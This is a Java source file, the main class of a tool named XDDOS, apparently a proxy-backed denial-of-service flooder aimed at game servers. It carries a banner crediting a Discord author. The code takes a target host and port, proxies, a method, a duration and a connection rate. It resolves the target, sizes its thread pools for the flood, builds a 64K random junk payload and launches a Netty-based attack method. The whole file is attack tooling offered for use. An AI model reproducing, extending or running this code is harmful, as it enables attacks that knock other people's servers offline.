package XD.XDDOS;

import XD.XDDOS.methods.Method;
import XD.XDDOS.utils.ArgsHelper;
import XD.XDDOS.utils.ServerAddress;

import java.io.File;
import java.net.InetAddress;
import java.util.Random;
import java.util.Scanner;

public class Main {
   //all variables 
   // make a file selector in gui so they can input proxy file or if they dont use that it will use proxy gen to gen proxy @glonk0

   public static File proxyFile;
   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;  
   public static int protocolLength;
   public static String methodID;
   public static Method method;
   public static int duration;
   public static int targetCPS;
   public static int nettyThreads;
   public static int loopThreads;
   public static String string;
   public static ProxyLoader proxies;
   public static int cpuselect;
   public static String serverhp;

   public static final String RED_BOLD = "\033[1;31m";    // RED
   public static final String GREEN_BOLD = "\033[1;32m";  // GREEN
   public static final String PURPLE_BOLD = "\033[1;35m"; // PURPLE
   public static final String WHITE_BOLD = "\033[1;37m";  // WHITE
   public static final String RESET = "\033[0m";
   public static final String CYAN_BOLD = "\033[1;36m";   // CYAN_BOLD

   public static void main(String[] args) throws Throwable {

      System.out.println();
      System.out.println();
      System.out.println(WHITE_BOLD + "██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n" +
                                      "╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n" +
                                      " ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n" +
                                      " ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n" +
                                      "██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n" +
                                      "╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n" +
                                      "\n" + RED_BOLD +
                                      "MADE BY: " + WHITE_BOLD + "xD_Aeryz#7240\n" + WHITE_BOLD + "> " + PURPLE_BOLD +
                                      "DISCORD: " + GREEN_BOLD + "http://discord.io/XDDOS\n" + WHITE_BOLD + "> " + WHITE_BOLD +
                                      "Starting XDDOS :-\n" + RESET +
                                      "\n" + GREEN_BOLD +
                                      "STARTING\n" + RESET );

                                      
      
      if(args.length != 6){
         ArgsHelper.UserFrndly(args);
      }
      else{
         ArgsHelper.OneLine(args);
      }
   }

   public static void run() throws Throwable {



         try {
            System.out.println("Resolving IP...");
            ServerAddress sa = ServerAddress.getAddrss(serverhp);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println("Resolved IP: " + resolved.getHostAddress());
            origIP = serverhp.split(":")[0];
            targetCPS = cpuselect + (int) Math.ceil((double) cpuselect / 100 * (50 + (double) cpuselect / 5000));
            nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
            loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
            protocolLength = protcolID > 128 ? 3 : 2;
            Random r = new Random();

            
            for (int i = 1; i < 65536; ++i) string = string + (char) (r.nextInt(125) + 1);

         } catch (Exception var4) {
            var4.printStackTrace();
            Thread.sleep(5000L);
            return;
         }

         Methods.setupMethods();
         method = Methods.getMethod(methodID);
      System.out.println("Running method: " + method);
      NettyBootstrap.start();
      }


   }
